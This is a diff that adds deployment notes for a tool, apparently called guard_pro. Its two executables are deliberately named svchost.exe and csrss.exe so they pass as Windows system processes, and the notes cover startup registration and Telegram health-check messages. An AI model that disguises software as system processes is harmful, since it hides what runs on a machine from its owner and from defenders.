@@ -1,0 +1,12 @@
+=== DEPLOYED ===
+Guard  EXE: dist/svchost.exe   (innocuous name)
+Wd EXE:     dist/csrss.exe     (innocuous name)
+
+Install/Uninstall:  python install.py   /   python install.py --remove
+
+Post-deploy verification:
+1. Run: python install.py   (compiles both EXEs, registers startup)
+2. Reboot OR manually run:  dist\svchost.exe  and  dist\csrss.exe
+3. Wait for startup health check Telegram message
+4. Check tasklist for svchost.exe and csrss.exe (two processes running)
+5. Verify offline_queue/ directory is created in guard_pro
